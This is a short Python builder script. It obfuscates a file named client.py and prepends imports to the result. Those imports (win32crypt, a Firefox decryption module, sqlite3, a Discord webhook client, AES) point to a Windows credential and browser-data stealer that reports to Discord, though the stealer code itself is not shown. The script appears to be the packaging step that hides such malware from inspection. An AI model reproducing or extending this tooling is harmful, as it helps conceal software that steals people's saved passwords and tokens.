import uuid
#from Crypto.Cipher import AES
import base64
import hashlib
import pyImpossibleObf

hashfile = "y"

pyImpossibleObf.obfuscate("client.py")
print("[.] Created client.py.hashed.py .")
txt = open("client.py.hashed.py", "r").read()
open("client.py.hashed.py", "w+").write("""import os
import wmi
import zipfile
import getpass
import psutil
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
from shutil import copyfile
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import shutil
import command
import socket
import time
import random
import threading
import re
import json
import uuid
import textwrap
from glob import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from regex import findall
import platform
from datetime import timezone, datetime, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler
import tkinter as tk
import pyImpossibleObf\n""" + txt)
